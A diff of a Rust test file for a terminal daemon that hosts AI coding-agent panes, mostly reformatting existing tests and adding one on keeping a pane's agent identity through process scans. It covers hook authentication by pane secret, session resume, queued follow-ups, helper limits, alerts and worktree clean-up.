@@ -9,7 +9,10 @@ use std::time::Duration;
 fn own_data_folder() {
     static ONCE: std::sync::Once = std::sync::Once::new();
     ONCE.call_once(|| {
-        let dir = std::env::temp_dir().join(format!(concat!(env!("APP_COMMAND"), "-test-data-{}"), std::process::id()));
+        let dir = std::env::temp_dir().join(format!(
+            concat!(env!("APP_COMMAND"), "-test-data-{}"),
+            std::process::id()
+        ));
         // SAFETY: first thing a daemon test does, before the panes it starts read the environment.
         unsafe { std::env::set_var("XDG_DATA_HOME", dir) };
     });
@@ -25,7 +28,8 @@ fn daemon() -> (Daemon, mpsc::Receiver<Ev>) {
 }
 
 fn pane(d: &mut Daemon) -> TermId {
-    d.spawn(None, &std::env::temp_dir(), 80, 24).expect("a shell pane")
+    d.spawn(None, &std::env::temp_dir(), 80, 24)
+        .expect("a shell pane")
 }
 
 fn report(term: TermId, token: &str, pid: u32, status: HookStatus, event: &str) -> ClientMsg {
@@ -87,13 +91,27 @@ fn codex_disk_results_cannot_cross_panes_or_survive_a_thread_change() {
         t.session = Some(session.into());
     }
     let facts = |term, session: &str, name: &str| usage::CodexPaneFacts {
-        term, session: Some(session.into()), usage: None,
+        term,
+        session: Some(session.into()),
+        usage: None,
         subagents: vec![(format!("{session}-child"), name.into())],
         subagent_activity: Vec::new(),
     };
-    d.codex_usage(vec![facts(a, "root-a", "planner"), facts(b, "root-b", "reviewer")], None);
-    assert_eq!(d.terms[&a].subagents, vec![("root-a-child".into(), "planner".into())]);
-    assert_eq!(d.terms[&b].subagents, vec![("root-b-child".into(), "reviewer".into())]);
+    d.codex_usage(
+        vec![
+            facts(a, "root-a", "planner"),
+            facts(b, "root-b", "reviewer"),
+        ],
+        None,
+    );
+    assert_eq!(
+        d.terms[&a].subagents,
+        vec![("root-a-child".into(), "planner".into())]
+    );
+    assert_eq!(
+        d.terms[&b].subagents,
+        vec![("root-b-child".into(), "reviewer".into())]
+    );
     let t = d.terms.get_mut(&a).unwrap();
     t.session = Some("replacement".into());
     t.subagents.clear();
@@ -125,15 +143,29 @@ fn disk_reported_helpers_keep_an_unhooked_codex_parent_working() {
     };
 
     d.codex_usage(vec![facts(vec![("child".into(), "planner".into())])], None);
-    assert!(d.terms[&t].subagent_seen.is_some(), "disk polling supplies helper liveness");
+    assert!(
+        d.terms[&t].subagent_seen.is_some(),
+        "disk polling supplies helper liveness"
+    );
     d.update_statuses();
-    assert_eq!(d.terms[&t].status, Status::Working, "the parent remains visibly active without hooks");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Working,
+        "the parent remains visibly active without hooks"
+    );
 
     d.codex_usage(vec![facts(Vec::new())], None);
-    assert!(d.terms[&t].subagent_seen.is_none(), "a completed helper clears its liveness timestamp");
+    assert!(
+        d.terms[&t].subagent_seen.is_none(),
+        "a completed helper clears its liveness timestamp"
+    );
     d.terms.get_mut(&t).unwrap().last_output = Instant::now() - Duration::from_secs(10);
     d.update_statuses();
-    assert_ne!(d.terms[&t].status, Status::Working, "the parent settles after the helper disappears");
+    assert_ne!(
+        d.terms[&t].status,
+        Status::Working,
+        "the parent settles after the helper disappears"
+    );
     close(&mut d, &[t]);
 }
 
@@ -143,14 +175,32 @@ fn codex_live_helper_hooks_attach_the_first_child_and_outvote_stale_disk_data() 
     let t = pane(&mut d);
     let secret = d.terms[&t].token.clone();
     let mut start = report(t, &secret, 0, HookStatus::Working, "SubagentStart");
-    if let ClientMsg::Hook { agent, session, subagent, .. } = &mut start {
+    if let ClientMsg::Hook {
+        agent,
+        session,
+        subagent,
+        ..
+    } = &mut start
+    {
         *agent = "codex".into();
         *session = Some("parent-thread".into());
-        *subagent = Some(crate::protocol::Subagent { id: "child-thread".into(), kind: "reviewer".into(), start: true, reported_at: 0, task: None, model: None, effort: None, activity: None });
+        *subagent = Some(crate::protocol::Subagent {
+            id: "child-thread".into(),
+            kind: "reviewer".into(),
+            start: true,
+            reported_at: 0,
+            task: None,
+            model: None,
+            effort: None,
+            activity: None,
+        });
     }
     d.apply_hook(start, Some(true), Vec::new());
     assert_eq!(d.terms[&t].session.as_deref(), Some("parent-thread"));
-    assert_eq!(d.terms[&t].subagents, vec![("child-thread".into(), "reviewer".into())]);
+    assert_eq!(
+        d.terms[&t].subagents,
+        vec![("child-thread".into(), "reviewer".into())]
+    );
     assert!(d.terms[&t].subagent_hooks_seen);
 
     let facts = |subagents| usage::CodexPaneFacts {
@@ -161,18 +211,46 @@ fn codex_live_helper_hooks_attach_the_first_child_and_outvote_stale_disk_data() 
         subagent_activity: Vec::new(),
     };
     d.codex_usage(vec![facts(Vec::new())], None);
-    assert_eq!(d.terms[&t].subagents.len(), 1, "an empty disk snapshot cannot erase the live hook entry");
+    assert_eq!(
+        d.terms[&t].subagents.len(),
+        1,
+        "an empty disk snapshot cannot erase the live hook entry"
+    );
 
     let mut stop = report(t, &secret, 0, HookStatus::Same, "SubagentStop");
-    if let ClientMsg::Hook { agent, session, subagent, .. } = &mut stop {
+    if let ClientMsg::Hook {
+        agent,
+        session,
+        subagent,
+        ..
+    } = &mut stop
+    {
         *agent = "codex".into();
         *session = Some("parent-thread".into());
-        *subagent = Some(crate::protocol::Subagent { id: "child-thread".into(), kind: "reviewer".into(), start: false, reported_at: 0, task: None, model: None, effort: None, activity: None });
+        *subagent = Some(crate::protocol::Subagent {
+            id: "child-thread".into(),
+            kind: "reviewer".into(),
+            start: false,
+            reported_at: 0,
+            task: None,
+            model: None,
+            effort: None,
+            activity: None,
+        });
     }
     d.apply_hook(stop, Some(true), Vec::new());
     assert!(d.terms[&t].subagents.is_empty());
-    d.codex_usage(vec![facts(vec![("child-thread".into(), "stale reviewer".into())])], None);
-    assert!(d.terms[&t].subagents.is_empty(), "stale disk data cannot resurrect a stopped helper");
+    d.codex_usage(
+        vec![facts(vec![(
+            "child-thread".into(),
+            "stale reviewer".into(),
+        )])],
+        None,
+    );
+    assert!(
+        d.terms[&t].subagents.is_empty(),
+        "stale disk data cannot resurrect a stopped helper"
+    );
     close(&mut d, &[t]);
 }
 
@@ -181,14 +259,28 @@ fn status_reports_need_the_pane_secret() {
     let (mut d, mut rx) = daemon();
     let t = pane(&mut d);
     let secret = d.terms[&t].token.clone();
-    d.message(0, report(t, "not-the-secret", 0, HookStatus::Blocked, "PreToolUse"));
+    d.message(
+        0,
+        report(t, "not-the-secret", 0, HookStatus::Blocked, "PreToolUse"),
+    );
     d.message(0, report(t, "", 0, HookStatus::Blocked, "PreToolUse"));
-    assert_eq!(settle_within(&mut d, &mut rx, 1, Duration::from_secs(1)), 0, "a report without the secret is never even checked");
+    assert_eq!(
+        settle_within(&mut d, &mut rx, 1, Duration::from_secs(1)),
+        0,
+        "a report without the secret is never even checked"
+    );
     assert_eq!(d.terms[&t].status, Status::None);
     d.message(0, report(t, &secret, 0, HookStatus::Blocked, "PreToolUse"));
     assert_eq!(settle(&mut d, &mut rx, 1), 1);
-    assert_eq!(d.terms[&t].status, Status::Blocked, "with the secret it counts");
-    assert_eq!(d.terms[&t].status_why, "hook: PreToolUse", "and it says what set it");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Blocked,
+        "with the secret it counts"
+    );
+    assert_eq!(
+        d.terms[&t].status_why, "hook: PreToolUse",
+        "and it says what set it"
+    );
     close(&mut d, &[t]);
 }
 
@@ -199,10 +291,18 @@ fn a_report_traced_outside_the_pane_is_dropped() {
     let secret = d.terms[&t].token.clone();
     // The hook thread found its process chain doesn't lead to the pane (a desktop app that
     // inherited the pane's environment, say): the report is dropped, secret or not.
-    d.apply_hook(report(t, &secret, 4242, HookStatus::Blocked, "PreToolUse"), Some(false), Vec::new());
+    d.apply_hook(
+        report(t, &secret, 4242, HookStatus::Blocked, "PreToolUse"),
+        Some(false),
+        Vec::new(),
+    );
     assert_eq!(d.terms[&t].status, Status::None);
     // Traced to the pane: it counts, and the chain is remembered for next time.
-    d.apply_hook(report(t, &secret, 4242, HookStatus::Blocked, "PreToolUse"), Some(true), vec![4242, 4243]);
+    d.apply_hook(
+        report(t, &secret, 4242, HookStatus::Blocked, "PreToolUse"),
+        Some(true),
+        vec![4242, 4243],
+    );
     assert_eq!(d.terms[&t].status, Status::Blocked);
     assert!(d.terms[&t].trusted.contains(&4243));
     close(&mut d, &[t]);
@@ -211,29 +311,71 @@ fn a_report_traced_outside_the_pane_is_dropped() {
 #[test]
 fn a_restore_never_starts_an_agents_task_over() {
     let (d, _rx) = daemon();
-    let saved = |agent: Option<&str>, cmd: &str| persist::SavedPane { agent: agent.map(String::from), cmd: Some(cmd.into()), ..Default::default() };
+    let saved = |agent: Option<&str>, cmd: &str| persist::SavedPane {
+        agent: agent.map(String::from),
+        cmd: Some(cmd.into()),
+        ..Default::default()
+    };
     // A helper saved without its agent (it lost it asleep): its command still names codex,
     // so it's resumed, not handed its task again.
-    let lost = saved(None, r#"codex "Fix the starting kit: give each faction its units""#);
-    assert_eq!(d.agent_in_cmd(lost.cmd.as_deref().unwrap()).as_deref(), Some("codex"));
-    assert_eq!(d.restore_cmd(&lost), None, "no session to resume: the agent isn't run again");
-    let named = persist::SavedPane { agent: Some("codex".into()), ..lost.clone() };
-    assert_eq!(d.restore_cmd(&named).as_deref(), Some("codex resume --last"), "known: resumed");
+    let lost = saved(
+        None,
+        r#"codex "Fix the starting kit: give each faction its units""#,
+    );
+    assert_eq!(
+        d.agent_in_cmd(lost.cmd.as_deref().unwrap()).as_deref(),
+        Some("codex")
+    );
+    assert_eq!(
+        d.restore_cmd(&lost),
+        None,
+        "no session to resume: the agent isn't run again"
+    );
+    let named = persist::SavedPane {
+        agent: Some("codex".into()),
+        ..lost.clone()
+    };
+    assert_eq!(
+        d.restore_cmd(&named).as_deref(),
+        Some("codex resume --last"),
+        "known: resumed"
+    );
     // By path, quoted, with .exe; an agent with no way to resume opens as a shell.
-    assert_eq!(d.agent_in_cmd(r#""C:\Users\me\.local\bin\claude.exe" --model opus "do it""#).as_deref(), Some("claude"));
-    assert_eq!(d.restore_cmd(&saved(Some("gemini"), r#"gemini "write the docs""#)), None);
+    assert_eq!(
+        d.agent_in_cmd(r#""C:\Users\me\.local\bin\claude.exe" --model opus "do it""#)
+            .as_deref(),
+        Some("claude")
+    );
+    assert_eq!(
+        d.restore_cmd(&saved(Some("gemini"), r#"gemini "write the docs""#)),
+        None
+    );
     // Anything else still comes back running what it ran.
     assert_eq!(d.agent_in_cmd("npm run dev"), None);
-    assert_eq!(d.restore_cmd(&saved(None, "npm run dev")).as_deref(), Some("npm run dev"));
+    assert_eq!(
+        d.restore_cmd(&saved(None, "npm run dev")).as_deref(),
+        Some("npm run dev")
+    );
 }
 
 #[test]
 fn a_session_keeps_its_account_through_sleep_and_restart() {
     let (mut d, _rx) = daemon();
-    d.cfg.quick.agents.push(crate::config::QuickAgent { name: "claude work".into(), command: "claude {prompt}".into(), env: [("CLAUDE_CONFIG_DIR".to_string(), "~/.claude-work".to_string())].into(), ..Default::default() });
+    d.cfg.quick.agents.push(crate::config::QuickAgent {
+        name: "claude work".into(),
+        command: "claude {prompt}".into(),
+        env: [(
+            "CLAUDE_CONFIG_DIR".to_string(),
+            "~/.claude-work".to_string(),
+        )]
+        .into(),
+        ..Default::default()
+    });
     let wrapped = d.cfg.as_account("claude work", "cmd /c exit");
     // Started as the account: the command line says so, and the pane remembers.
-    let t = d.spawn(Some(&wrapped), &std::env::temp_dir(), 80, 24).expect("it starts");
+    let t = d
+        .spawn(Some(&wrapped), &std::env::temp_dir(), 80, 24)
+        .expect("it starts");
     assert_eq!(d.terms[&t].account.as_deref(), Some("claude work"));
     let plain = pane(&mut d);
     assert_eq!(d.terms[&plain].account, None);
@@ -243,15 +385,36 @@ fn a_session_keeps_its_account_through_sleep_and_restart() {
         (p.agent, p.session) = (Some("claude".into()), Some("abc123".into()));
     }
     let resume = d.resume_cmd(&d.terms[&t]).expect("claude can be resumed");
-    assert!(resume.starts_with(concat!(env!("APP_COMMAND"), " account ")) && resume.contains("claude work") && resume.contains("abc123"), "{resume}");
+    assert!(
+        resume.starts_with(concat!(env!("APP_COMMAND"), " account "))
+            && resume.contains("claude work")
+            && resume.contains("abc123"),
+        "{resume}"
+    );
     // And after the server restarts.
     let saved = d.saved();
-    assert!(saved.workspaces.is_empty(), "these panes are in no workspace");
-    let pane = persist::SavedPane { agent: Some("claude".into()), session: Some("abc123".into()), account: Some("claude work".into()), ..Default::default() };
+    assert!(
+        saved.workspaces.is_empty(),
+        "these panes are in no workspace"
+    );
+    let pane = persist::SavedPane {
+        agent: Some("claude".into()),
+        session: Some("abc123".into()),
+        account: Some("claude work".into()),
+        ..Default::default()
+    };
     let again = d.restore_cmd(&pane).expect("restored as a resume");
     assert_eq!(again, resume);
-    let old: persist::SavedPane = serde_json::from_str(r#"{"cwd":null,"cmd":null,"agent":"claude","session":"abc123","aside":0}"#).unwrap();
-    assert!(!d.restore_cmd(&old).unwrap().starts_with(concat!(env!("APP_COMMAND"), " account")), "one saved before accounts resumes as itself");
+    let old: persist::SavedPane = serde_json::from_str(
+        r#"{"cwd":null,"cmd":null,"agent":"claude","session":"abc123","aside":0}"#,
+    )
+    .unwrap();
+    assert!(
+        !d.restore_cmd(&old)
+            .unwrap()
+            .starts_with(concat!(env!("APP_COMMAND"), " account")),
+        "one saved before accounts resumes as itself"
+    );
     close(&mut d, &[t, plain]);
 }
 
@@ -264,10 +427,38 @@ fn a_queued_follow_up_goes_in_when_the_turn_is_over() {
         (p.agent, p.hooked, p.status) = (Some("claude".into()), true, Status::Working);
     }
     let queued = |d: &Daemon| d.snapshot().terms[&t].queued.clone();
-    d.command(0, Command::QueueFollowUp { term: t, text: "  then run the tests ".into() }).unwrap();
-    d.command(0, Command::QueueFollowUp { term: t, text: "and open a PR".into() }).unwrap();
-    assert_eq!(queued(&d), ["then run the tests", "and open a PR"], "kept by the server, in order");
-    assert!(d.command(0, Command::QueueFollowUp { term: t, text: "  ".into() }).is_err(), "nothing to queue");
+    d.command(
+        0,
+        Command::QueueFollowUp {
+            term: t,
+            text: "  then run the tests ".into(),
+        },
+    )
+    .unwrap();
+    d.command(
+        0,
+        Command::QueueFollowUp {
+            term: t,
+            text: "and open a PR".into(),
+        },
+    )
+    .unwrap();
+    assert_eq!(
+        queued(&d),
+        ["then run the tests", "and open a PR"],
+        "kept by the server, in order"
+    );
+    assert!(
+        d.command(
+            0,
+            Command::QueueFollowUp {
+                term: t,
+                text: "  ".into()
+            }
+        )
+        .is_err(),
+        "nothing to queue"
+    );
     // Still working: nothing is typed.
     d.update_statuses();
     assert_eq!(queued(&d).len(), 2);
@@ -281,7 +472,11 @@ fn a_queued_follow_up_goes_in_when_the_turn_is_over() {
     d.update_statuses();
     assert_eq!(queued(&d), ["and open a PR"], "one at a time");
     d.update_statuses();
-    assert_eq!(queued(&d).len(), 1, "the next waits for the turn that one starts");
+    assert_eq!(
+        queued(&d).len(),
+        1,
+        "the next waits for the turn that one starts"
+    );
     // That turn starts and ends: the next goes.
     d.set_status(t, Status::Working, "test");
     d.set_status(t, Status::Done, "test");
@@ -289,20 +484,47 @@ fn a_queued_follow_up_goes_in_when_the_turn_is_over() {
     assert!(queued(&d).is_empty());
     // Dropping what's queued; a shell takes none.
     d.set_status(t, Status::Working, "test");
-    d.command(0, Command::QueueFollowUp { term: t, text: "never mind".into() }).unwrap();
+    d.command(
+        0,
+        Command::QueueFollowUp {
+            term: t,
+            text: "never mind".into(),
+        },
+    )
+    .unwrap();
     d.command(0, Command::ClearQueue { term: t }).unwrap();
     assert!(queued(&d).is_empty());
     d.terms.get_mut(&t).unwrap().agent = None;
-    assert!(d.command(0, Command::QueueFollowUp { term: t, text: "ls".into() }).is_err());
+    assert!(
+        d.command(
+            0,
+            Command::QueueFollowUp {
+                term: t,
+                text: "ls".into()
+            }
+        )
+        .is_err()
+    );
     close(&mut d, &[t]);
 }
 
 #[test]
 fn a_queued_message_of_several_lines_goes_in_as_one_paste() {
     use super::status::queued_as_typed;
-    assert_eq!(queued_as_typed("exit 1\nFAIL a\r\nFAIL b", true), "\x1b[200~exit 1\rFAIL a\rFAIL b\x1b[201~");
-    assert_eq!(queued_as_typed("exit 1\nFAIL a", false), "exit 1 FAIL a", "no paste mode: one line");
-    assert_eq!(queued_as_typed("then run the tests", true), "then run the tests", "one line is typed as is");
+    assert_eq!(
+        queued_as_typed("exit 1\nFAIL a\r\nFAIL b", true),
+        "\x1b[200~exit 1\rFAIL a\rFAIL b\x1b[201~"
+    );
+    assert_eq!(
+        queued_as_typed("exit 1\nFAIL a", false),
+        "exit 1 FAIL a",
+        "no paste mode: one line"
+    );
+    assert_eq!(
+        queued_as_typed("then run the tests", true),
+        "then run the tests",
+        "one line is typed as is"
+    );
 }
 
 #[test]
@@ -313,24 +535,74 @@ fn a_pane_started_as_an_agent_keeps_its_name_while_the_agent_starts() {
     // claude's own process exists.
     {
         let p = d.terms.get_mut(&t).unwrap();
-        (p.agent, p.session, p.summary) = (Some("claude".into()), Some("abc".into()), "the task".into());
+        (p.agent, p.session, p.summary) =
+            (Some("claude".into()), Some("abc".into()), "the task".into());
     }
-    let nothing_yet = |term| scan::Found { term, process: "powershell".into(), agent: None, cwd: None, agent_cwd: None, mem: 0, cpu: 0.0, remote: None };
+    let nothing_yet = |term| scan::Found {
+        term,
+        process: "powershell".into(),
+        agent: None,
+        cwd: None,
+        agent_cwd: None,
+        mem: 0,
+        cpu: 0.0,
+        remote: None,
+    };
     d.handle(Ev::Scan(vec![nothing_yet(t)]));
     let p = &d.terms[&t];
-    assert_eq!((p.agent.as_deref(), p.session.as_deref(), p.summary.as_str()), (Some("claude"), Some("abc"), "the task"), "still claude, conversation and all");
+    assert_eq!(
+        (p.agent.as_deref(), p.session.as_deref(), p.summary.as_str()),
+        (Some("claude"), Some("abc"), "the task"),
+        "still claude, conversation and all"
+    );
     // Asleep, long after: there's no process to find, and it's still claude.
     {
         let p = d.terms.get_mut(&t).unwrap();
-        (p.asleep, p.born) = (true, Instant::now() - super::AGENT_SHOWS_WITHIN - Duration::from_secs(1));
+        (p.asleep, p.born) = (
+            true,
+            Instant::now() - super::AGENT_SHOWS_WITHIN - Duration::from_secs(1),
+        );
     }
     d.handle(Ev::Scan(vec![nothing_yet(t)]));
-    assert_eq!((d.terms[&t].agent.as_deref(), d.terms[&t].session.as_deref()), (Some("claude"), Some("abc")), "a sleeping agent stays an agent");
+    assert_eq!(
+        (d.terms[&t].agent.as_deref(), d.terms[&t].session.as_deref()),
+        (Some("claude"), Some("abc")),
+        "a sleeping agent stays an agent"
+    );
     d.terms.get_mut(&t).unwrap().asleep = false;
     // Long past the time an agent takes to start, with still no agent there: it's a shell.
-    d.terms.get_mut(&t).unwrap().born = Instant::now() - super::AGENT_SHOWS_WITHIN - Duration::from_secs(1);
+    d.terms.get_mut(&t).unwrap().born =
+        Instant::now() - super::AGENT_SHOWS_WITHIN - Duration::from_secs(1);
     d.handle(Ev::Scan(vec![nothing_yet(t)]));
     assert_eq!(d.terms[&t].agent, None);
+    close(&mut d, &[t]);
+}
+
+#[test]
+fn process_scan_cannot_erase_a_native_conversations_provider_identity() {
+    let (mut d, _rx) = daemon();
+    let t = pane(&mut d);
+    {
+        let p = d.terms.get_mut(&t).unwrap();
+        p.conversation_id = Some(crate::conversation::ConversationId(7));
+        p.agent = Some("codex".into());
+        p.session = Some("exact-thread".into());
+        p.status = Status::Done;
+    }
+    d.handle(Ev::Scan(vec![scan::Found {
+        term: t,
+        process: "node".into(),
+        agent: None,
+        cwd: None,
+        agent_cwd: None,
+        mem: 0,
+        cpu: 0.0,
+        remote: None,
+    }]));
+    let p = &d.terms[&t];
+    assert_eq!(p.agent.as_deref(), Some("codex"));
+    assert_eq!(p.session.as_deref(), Some("exact-thread"));
+    assert_eq!(p.status, Status::Done);
     close(&mut d, &[t]);
 }
 
@@ -346,19 +618,43 @@ fn an_agent_is_working_while_one_of_its_own_runs_in_the_background() {
         p.subagent_seen = Some(Instant::now());
     }
     d.update_statuses();
-    assert_eq!(d.terms[&t].status, Status::Working, "still working: its own agent is");
-    assert!(d.terms[&t].done_held.is_some(), "and held, so that agent finishing ends it");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Working,
+        "still working: its own agent is"
+    );
+    assert!(
+        d.terms[&t].done_held.is_some(),
+        "and held, so that agent finishing ends it"
+    );
     d.update_statuses();
-    assert_eq!(d.terms[&t].status, Status::Working, "steady: it doesn't flip back and forth");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Working,
+        "steady: it doesn't flip back and forth"
+    );
     // The background agent finishes: now the turn is over.
     let secret = d.terms[&t].token.clone();
     let mut stop = report(t, &secret, 0, HookStatus::Same, "SubagentStop");
     if let ClientMsg::Hook { subagent, .. } = &mut stop {
-        *subagent = Some(crate::protocol::Subagent { id: "a1".into(), kind: "general-purpose".into(), start: false, reported_at: 0, task: None, model: None, effort: None, activity: None });
+        *subagent = Some(crate::protocol::Subagent {
+            id: "a1".into(),
+            kind: "general-purpose".into(),
+            start: false,
+            reported_at: 0,
+            task: None,
+            model: None,
+            effort: None,
+            activity: None,
+        });
     }
     d.apply_hook(stop, Some(true), Vec::new());
     assert!(d.terms[&t].subagents.is_empty());
-    assert_eq!(d.terms[&t].status, Status::Done, "its last one finished: done");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Done,
+        "its last one finished: done"
+    );
     d.update_statuses();
     assert_eq!(d.terms[&t].status, Status::Done, "and it stays done");
     // One that went silent long ago (it died without saying so) doesn't hold it working.
@@ -366,7 +662,8 @@ fn an_agent_is_working_while_one_of_its_own_runs_in_the_background() {
         let p = d.terms.get_mut(&t).unwrap();
         p.status = Status::Idle;
         p.subagents.push(("a2".into(), "general-purpose".into()));
-        p.subagent_seen = Some(Instant::now() - super::status::SUBAGENTS_QUIET_AT_MOST - Duration::from_secs(1));
+        p.subagent_seen =
+            Some(Instant::now() - super::status::SUBAGENTS_QUIET_AT_MOST - Duration::from_secs(1));
     }
     d.update_statuses();
     assert_eq!(d.terms[&t].status, Status::Idle);
@@ -378,12 +675,37 @@ fn only_so_many_helpers_work_at_once() {
     let (mut d, _rx) = daemon();
     d.cfg.sessions.helpers_at_once = "2".into();
     let here = Some(std::env::temp_dir());
-    d.command(0, Command::NewWorkspace { cwd: here.clone(), name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: here.clone(),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     let starter = d.workspaces[0].tabs[0].focus;
     let token = d.terms[&starter].token.clone();
     let mut c = from_pane(&mut d, 1, starter, &token);
-    let start = |d: &mut Daemon| d.handle(Ev::Msg(1, ClientMsg::Command(Command::NewWorkspace { cwd: Some(std::env::temp_dir()), name: None, cmd: None })));
-    let refused = |c: &mut mpsc::Receiver<ServerMsg>| std::iter::from_fn(|| c.try_recv().ok()).find_map(|m| if let ServerMsg::Error(e) = m { Some(e) } else { None });
+    let start = |d: &mut Daemon| {
+        d.handle(Ev::Msg(
+            1,
+            ClientMsg::Command(Command::NewWorkspace {
+                cwd: Some(std::env::temp_dir()),
+                name: None,
+                cmd: None,
+            }),
+        ))
+    };
+    let refused = |c: &mut mpsc::Receiver<ServerMsg>| {
+        std::iter::from_fn(|| c.try_recv().ok()).find_map(|m| {
+            if let ServerMsg::Error(e) = m {
+                Some(e)
+            } else {
+                None
+            }
+        })
+    };
     // Two helpers, just started: both count as working until their agents report.
     start(&mut d);
     start(&mut d);
@@ -392,15 +714,31 @@ fn only_so_many_helpers_work_at_once() {
     // A third is refused, and told what to do.
     start(&mut d);
     let why = refused(&mut c).expect("the third is refused");
-    assert!(d.terms.len() == 3 && why.contains("2 helpers are already working") && why.contains("Wait for one to finish"), "{why}");
+    assert!(
+        d.terms.len() == 3
+            && why.contains("2 helpers are already working")
+            && why.contains("Wait for one to finish"),
+        "{why}"
+    );
     // One finishes (and has been up a while): there's room again.
     let helpers: Vec<TermId> = d.terms.keys().copied().filter(|t| *t != starter).collect();
     let done = d.terms.get_mut(&helpers[0]).unwrap();
-    (done.status, done.born) = (Status::Done, Instant::now() - super::HELPER_SETTLES - Duration::from_secs(1));
+    (done.status, done.born) = (
+        Status::Done,
+        Instant::now() - super::HELPER_SETTLES - Duration::from_secs(1),
+    );
     start(&mut d);
     assert_eq!(d.terms.len(), 4, "a helper finished: the next may start");
     // What you start yourself never counts, and never waits.
-    d.command(0, Command::NewWorkspace { cwd: here.clone(), name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: here.clone(),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     assert_eq!(d.terms.len(), 5);
     let all: Vec<TermId> = d.terms.keys().copied().collect();
     close(&mut d, &all);
@@ -420,12 +758,19 @@ fn with_no_window_a_transient_question_cannot_ring_after_work_resumes() {
     d.settled_alerts();
     assert!(d.terms[&term].alerted.is_none());
     // Even an obsolete queued deadline must match the current status.
-    d.terms.get_mut(&term).unwrap().alert_due = Some((Status::Blocked, Instant::now() - Duration::from_millis(1)));
+    d.terms.get_mut(&term).unwrap().alert_due =
+        Some((Status::Blocked, Instant::now() - Duration::from_millis(1)));
     d.settled_alerts();
     assert!(d.terms[&term].alerted.is_none());
     // A real question remains red and gets one request sound after settling.
     d.set_status(term, Status::Blocked, "test");
-    d.terms.get_mut(&term).unwrap().alert_due.as_mut().unwrap().1 = Instant::now() - Duration::from_millis(1);
+    d.terms
+        .get_mut(&term)
+        .unwrap()
+        .alert_due
+        .as_mut()
+        .unwrap()
+        .1 = Instant::now() - Duration::from_millis(1);
     d.settled_alerts();
     assert_eq!(d.terms[&term].alerted.unwrap().0, Status::Blocked);
     close(&mut d, &[term]);
@@ -439,11 +784,17 @@ fn with_no_window_open_finished_waits_and_a_helper_stays_quiet() {
         d.terms.get_mut(&t).unwrap().agent = Some("claude".into());
     }
     let rang = |d: &Daemon, t: TermId| d.terms[&t].alerted.map(|(s, _)| s);
-    let overdue = |d: &mut Daemon, t: TermId| d.terms.get_mut(&t).unwrap().alert_due.as_mut().unwrap().1 = Instant::now() - Duration::from_millis(1);
+    let overdue = |d: &mut Daemon, t: TermId| {
+        d.terms.get_mut(&t).unwrap().alert_due.as_mut().unwrap().1 =
+            Instant::now() - Duration::from_millis(1)
+    };
     // Finished: not said yet.
     d.set_status(starter, Status::Working, "test");
     d.set_status(starter, Status::Done, "test");
-    assert!(rang(&d, starter).is_none() && d.terms[&starter].alert_due.is_some(), "it waits");
+    assert!(
+        rang(&d, starter).is_none() && d.terms[&starter].alert_due.is_some(),
+        "it waits"
+    );
     // Back to work before the wait is over: never said.
     d.set_status(starter, Status::Working, "test");
     assert!(d.terms[&starter].alert_due.is_none());
@@ -471,7 +822,10 @@ fn with_no_window_open_finished_waits_and_a_helper_stays_quiet() {
 #[test]
 fn a_clean_up_only_takes_worktrees_nothing_runs_in() {
     let (mut d, _rx) = daemon();
-    let root = std::env::temp_dir().join(format!(concat!(env!("APP_COMMAND"), "-tidy-plan-{}"), std::process::id()));
+    let root = std::env::temp_dir().join(format!(
+        concat!(env!("APP_COMMAND"), "-tidy-plan-{}"),
+        std::process::id()
+    ));
     let _ = std::fs::remove_dir_all(&root);
     let repo = root.join("repo");
     std::fs::create_dir_all(&repo).unwrap();
@@ -483,28 +837,75 @@ fn a_clean_up_only_takes_worktrees_nothing_runs_in() {
     git(&repo, &["add", "."]);
     git(&repo, &["commit", "-qm", "one"]);
     let (idle, busy) = (root.join("idle"), root.join("busy"));
-    git(&repo, &["worktree", "add", "-q", "-b", "idle", idle.to_str().unwrap()]);
-    git(&repo, &["worktree", "add", "-q", "-b", "busy", busy.to_str().unwrap()]);
+    git(
+        &repo,
+        &[
+            "worktree",
+            "add",
+            "-q",
+            "-b",
+            "idle",
+            idle.to_str().unwrap(),
+        ],
+    );
+    git(
+        &repo,
+        &[
+            "worktree",
+            "add",
+            "-q",
+            "-b",
+            "busy",
+            busy.to_str().unwrap(),
+        ],
+    );
     // A session in one of them.
     let t = d.spawn(None, &busy, 80, 24).expect("a shell there");
     d.terms.get_mut(&t).unwrap().refresh_head();
-    assert!(d.runs_in(&crate::gitfs::head(&busy).unwrap().top) && !d.runs_in(&crate::gitfs::head(&idle).unwrap().top));
+    assert!(
+        d.runs_in(&crate::gitfs::head(&busy).unwrap().top)
+            && !d.runs_in(&crate::gitfs::head(&idle).unwrap().top)
+    );
     d.terms.get_mut(&t).unwrap().head = None;
-    assert!(d.runs_in(&busy), "a restored pane protects its checkout before git detection completes");
-    let (go, stay) = d.tidy_plan(vec![(idle.clone(), false), (busy.clone(), true), (repo.clone(), false), (root.join("nowhere"), false)]);
+    assert!(
+        d.runs_in(&busy),
+        "a restored pane protects its checkout before git detection completes"
+    );
+    let (go, stay) = d.tidy_plan(vec![
+        (idle.clone(), false),
+        (busy.clone(), true),
+        (repo.clone(), false),
+        (root.join("nowhere"), false),
+    ]);
     assert_eq!(go.len(), 1, "only the idle one goes: {go:?}");
     assert!(same_path(&go[0].0, &idle) && !go[0].1);
     let why: Vec<(&str, &str)> = stay.iter().map(|(n, w)| (n.as_str(), w.as_str())).collect();
-    assert_eq!(why, [("busy", "something is running in it"), ("repo", "it isn't a worktree"), ("nowhere", "it isn't a worktree")], "the main folder is never one");
-    let sibling = d.spawn(None, &busy, 80, 24).expect("a second pane in the checkout");
+    assert_eq!(
+        why,
+        [
+            ("busy", "something is running in it"),
+            ("repo", "it isn't a worktree"),
+            ("nowhere", "it isn't a worktree")
+        ],
+        "the main folder is never one"
+    );
+    let sibling = d
+        .spawn(None, &busy, 80, 24)
+        .expect("a second pane in the checkout");
     d.terms.get_mut(&t).unwrap().refresh_head();
     d.terms.get_mut(&sibling).unwrap().head = None;
